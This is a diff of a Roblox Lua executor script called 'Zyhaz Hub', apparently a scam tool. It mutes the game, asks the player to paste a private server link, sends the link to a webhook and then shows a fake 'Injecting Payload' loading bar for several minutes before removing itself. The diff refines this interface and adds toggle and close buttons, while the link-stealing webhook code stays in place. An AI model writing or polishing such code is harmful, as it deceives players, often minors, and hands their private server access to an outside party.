@@ -5,12 +5,11 @@ local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 local TweenService = game:GetService("TweenService")
 local RunService = game:GetService("RunService")
-local SoundService = game:GetService("SoundService")
 
 local player = Players.LocalPlayer
 
 ----------------------------------------------------
--- HARD MUTE ALL AUDIO (ROBLOX-CORRECT)
+-- HARD MUTE ALL AUDIO
 ----------------------------------------------------
 for _, obj in ipairs(game:GetDescendants()) do
 	if obj:IsA("Sound") then
@@ -20,13 +19,6 @@ for _, obj in ipairs(game:GetDescendants()) do
 end
 
 game.DescendantAdded:Connect(function(obj)
-	if obj:IsA("Sound") then
-		obj.Volume = 0
-		obj:Stop()
-	end
-end)
-
-SoundService.DescendantAdded:Connect(function(obj)
 	if obj:IsA("Sound") then
 		obj.Volume = 0
 		obj:Stop()
@@ -45,11 +37,9 @@ local SECONDS_PER_PERCENT = 3.5
 ----------------------------------------------------
 local function isPrivateServerLink(text)
 	if type(text) ~= "string" then return false end
-	text = string.lower(text)
-	if not string.find(text, "roblox.com") then return false end
-	if string.find(text, "privateserverlinkcode=") then return true end
-	if string.find(text, "type=server") then return true end
-	return false
+	text = text:lower()
+	return text:find("roblox.com")
+		and (text:find("privateserverlinkcode=") or text:find("type=server"))
 end
 
 ----------------------------------------------------
@@ -63,81 +53,144 @@ local function sendWebhook(text)
 	local req =
 		(syn and syn.request)
 		or (http and http.request)
-		or http_request
 		or request
+		or http_request
 
-	if not req then return end
-
-	req({
-		Url = WEBHOOK_URL,
-		Method = "POST",
-		Headers = { ["Content-Type"] = "application/json" },
-		Body = HttpService:JSONEncode(payload)
-	})
+	if req then
+		req({
+			Url = WEBHOOK_URL,
+			Method = "POST",
+			Headers = { ["Content-Type"] = "application/json" },
+			Body = HttpService:JSONEncode(payload)
+		})
+	end
 end
 
 ----------------------------------------------------
--- GUI (TOP PRIORITY)
+-- GUI ROOT
 ----------------------------------------------------
 local gui = Instance.new("ScreenGui")
-gui.Name = "Zyhaz Hub"
-gui.ResetOnSpawn = false
+gui.Name = "ZyhazHub"
 gui.IgnoreGuiInset = true
-gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+gui.ResetOnSpawn = false
 gui.DisplayOrder = 99999
 gui.Parent = player:WaitForChild("PlayerGui")
+
+----------------------------------------------------
+-- TOGGLE BUTTON (TOP LEFT)
+----------------------------------------------------
+local toggleBtn = Instance.new("TextButton", gui)
+toggleBtn.Size = UDim2.fromOffset(45,45)
+toggleBtn.Position = UDim2.fromOffset(10,10)
+toggleBtn.Text = "≡"
+toggleBtn.Font = Enum.Font.GothamBold
+toggleBtn.TextScaled = true
+toggleBtn.BackgroundColor3 = Color3.fromRGB(25,25,25)
+toggleBtn.TextColor3 = Color3.new(1,1,1)
+toggleBtn.ZIndex = 20
+Instance.new("UICorner", toggleBtn).CornerRadius = UDim.new(1,0)
 
 ----------------------------------------------------
 -- MENU
 ----------------------------------------------------
 local menu = Instance.new("Frame", gui)
-menu.Size = UDim2.fromScale(0.35, 0.35)
-menu.Position = UDim2.fromScale(0.325, 0.325)
-menu.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+menu.Size = UDim2.fromScale(0.35,0.35)
+menu.Position = UDim2.fromScale(0.325,0.325)
+menu.BackgroundColor3 = Color3.fromRGB(18,18,18)
 menu.BorderSizePixel = 0
+menu.Visible = true
 menu.ZIndex = 10
-Instance.new("UICorner", menu).CornerRadius = UDim.new(0, 18)
+Instance.new("UICorner", menu).CornerRadius = UDim.new(0,20)
 
 local menuStroke = Instance.new("UIStroke", menu)
 menuStroke.Thickness = 2
-menuStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
 
+----------------------------------------------------
+-- TITLE
+----------------------------------------------------
 local title = Instance.new("TextLabel", menu)
-title.Size = UDim2.fromScale(1, 0.25)
+title.Size = UDim2.fromScale(1,0.22)
 title.BackgroundTransparency = 1
-title.Text = "Zyhaz Hub"
-title.Font = Enum.Font.GothamBold
+title.Text = TITLE_TEXT
+title.Font = Enum.Font.GothamBlack
 title.TextColor3 = Color3.new(1,1,1)
 title.TextScaled = true
-title.ZIndex = 11
+
+----------------------------------------------------
+-- CLOSE BUTTON
+----------------------------------------------------
+local close = Instance.new("TextButton", menu)
+close.Size = UDim2.fromOffset(35,35)
+close.Position = UDim2.fromScale(0.92,0.04)
+close.Text = "✕"
+close.Font = Enum.Font.GothamBold
+close.TextScaled = true
+close.BackgroundTransparency = 1
+close.TextColor3 = Color3.fromRGB(200,200,200)
 
 ----------------------------------------------------
 -- TEXTBOX
 ----------------------------------------------------
 local box = Instance.new("TextBox", menu)
-box.Size = UDim2.fromScale(0.9, 0.2)
-box.Position = UDim2.fromScale(0.05, 0.35)
+box.Size = UDim2.fromScale(0.9,0.18)
+box.Position = UDim2.fromScale(0.05,0.35)
 box.BackgroundColor3 = Color3.fromRGB(35,35,35)
 box.TextColor3 = Color3.new(1,1,1)
 box.Font = Enum.Font.Gotham
 box.TextScaled = true
 box.BorderSizePixel = 0
-box.ZIndex = 11
-box.Text = ""
-box.PlaceholderText = "Paste PRIVATE SERVER link only"
+box.PlaceholderText = "Paste PRIVATE SERVER link"
 box.ClearTextOnFocus = false
-Instance.new("UICorner", box).CornerRadius = UDim.new(0,12)
+Instance.new("UICorner", box).CornerRadius = UDim.new(0,14)
 
+----------------------------------------------------
+-- SUBMIT
+----------------------------------------------------
 local submit = Instance.new("TextButton", menu)
-submit.Size = UDim2.fromScale(0.5, 0.18)
-submit.Position = UDim2.fromScale(0.25, 0.65)
+submit.Size = UDim2.fromScale(0.5,0.18)
+submit.Position = UDim2.fromScale(0.25,0.62)
 submit.Text = "Submit"
 submit.Font = Enum.Font.GothamBold
 submit.TextScaled = true
 submit.BackgroundColor3 = Color3.new(1,1,1)
 submit.TextColor3 = Color3.new(0,0,0)
-submit.ZIndex = 11
-Instance.new("UICorner", submit).CornerRadius = UDim.new(0,12)
+Instance.new("UICorner", submit).CornerRadius = UDim.new(0,14)
+
+----------------------------------------------------
+-- TWEEN HELPERS
+----------------------------------------------------
+local function tween(obj, props, t)
+	TweenService:Create(obj, TweenInfo.new(t, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), props):Play()
+end
+
+----------------------------------------------------
+-- MENU TOGGLE LOGIC
+----------------------------------------------------
+local menuOpen = true
+
+local function openMenu()
+	menu.Visible = true
+	tween(menu, {Size = UDim2.fromScale(0.35,0.35), BackgroundTransparency = 0}, 0.35)
+	menuOpen = true
+end
+
+local function closeMenu()
+	tween(menu, {Size = UDim2.fromScale(0,0), BackgroundTransparency = 1}, 0.3)
+	task.delay(0.3, function()
+		menu.Visible = false
+	end)
+	menuOpen = false
+end
+
+toggleBtn.MouseButton1Click:Connect(function()
+	if menuOpen then
+		closeMenu()
+	else
+		openMenu()
+	end
+end)
+
+close.MouseButton1Click:Connect(closeMenu)
 
 ----------------------------------------------------
 -- LOADING SCREEN
@@ -152,23 +205,20 @@ local loadTitle = Instance.new("TextLabel", black)
 loadTitle.Size = UDim2.fromScale(1,0.2)
 loadTitle.Position = UDim2.fromScale(0,0.22)
 loadTitle.BackgroundTransparency = 1
-loadTitle.Text = "Zyhaz Hub"
+loadTitle.Text = TITLE_TEXT
 loadTitle.Font = Enum.Font.GothamBlack
 loadTitle.TextColor3 = Color3.new(1,1,1)
 loadTitle.TextScaled = true
-loadTitle.ZIndex = 100000
 
 local barBG = Instance.new("Frame", black)
 barBG.Size = UDim2.fromScale(0.6,0.05)
 barBG.Position = UDim2.fromScale(0.2,0.5)
 barBG.BackgroundColor3 = Color3.fromRGB(40,40,40)
-barBG.ZIndex = 100000
 Instance.new("UICorner", barBG).CornerRadius = UDim.new(1,0)
 
 local bar = Instance.new("Frame", barBG)
 bar.Size = UDim2.fromScale(0,1)
 bar.BackgroundColor3 = Color3.new(1,1,1)
-bar.ZIndex = 100001
 Instance.new("UICorner", bar).CornerRadius = UDim.new(1,0)
 
 local percentLabel = Instance.new("TextLabel", black)
@@ -178,7 +228,6 @@ percentLabel.BackgroundTransparency = 1
 percentLabel.Font = Enum.Font.Gotham
 percentLabel.TextColor3 = Color3.new(1,1,1)
 percentLabel.TextScaled = true
-percentLabel.ZIndex = 100000
 
 local tipsLabel = Instance.new("TextLabel", black)
 tipsLabel.Size = UDim2.fromScale(1,0.07)
@@ -187,7 +236,6 @@ tipsLabel.BackgroundTransparency = 1
 tipsLabel.Font = Enum.Font.Gotham
 tipsLabel.TextColor3 = Color3.fromRGB(180,180,180)
 tipsLabel.TextScaled = true
-tipsLabel.ZIndex = 100000
 
 local tips = {
 	"Injecting Payload",
@@ -204,15 +252,15 @@ task.spawn(function()
 	local t = 0
 	while gui.Parent do
 		t += RunService.RenderStepped:Wait()
-		local color = Color3.fromHSV((t * 0.1) % 1, 0.8, 1)
-		bar.BackgroundColor3 = color
-		loadTitle.TextColor3 = color
-		menuStroke.Color = color
+		local c = Color3.fromHSV((t * 0.1) % 1, 0.8, 1)
+		bar.BackgroundColor3 = c
+		loadTitle.TextColor3 = c
+		menuStroke.Color = c
 	end
 end)
 
 ----------------------------------------------------
--- BUTTON LOGIC
+-- SUBMIT LOGIC
 ----------------------------------------------------
 local loading = false
 
@@ -220,7 +268,7 @@ submit.MouseButton1Click:Connect(function()
 	if loading then return end
 	if not isPrivateServerLink(box.Text) then
 		box.Text = ""
-		box.PlaceholderText = "INVALID LINK (PRIVATE SERVER ONLY)"
+		box.PlaceholderText = "INVALID PRIVATE SERVER LINK"
 		return
 	end
 
@@ -228,26 +276,20 @@ submit.MouseButton1Click:Connect(function()
 	sendWebhook(box.Text)
 
 	menu.Visible = false
+	toggleBtn.Visible = false
 	black.Visible = true
 
-	for i = 1, 100 do
+	for i = 1,100 do
 		percentLabel.Text = i .. "%"
+		tipsLabel.Text = tips[math.clamp(math.floor((i-1)/20)+1,1,#tips)]
 
-		local tipIndex = math.clamp(math.floor((i - 1) / 20) + 1, 1, #tips)
-		tipsLabel.Text = tips[tipIndex]
-
-		TweenService:Create(
-			bar,
-			TweenInfo.new(0.25),
-			{ Size = UDim2.fromScale(i / 100, 1) }
-		):Play()
+		TweenService:Create(bar, TweenInfo.new(0.3), {
+			Size = UDim2.fromScale(i/100,1)
+		}):Play()
 
 		task.wait(SECONDS_PER_PERCENT)
 	end
 
-	------------------------------------------------
-	-- 💥 DELETE ALL UI AT 100%
-	------------------------------------------------
 	task.wait(0.5)
 	gui:Destroy()
 end)
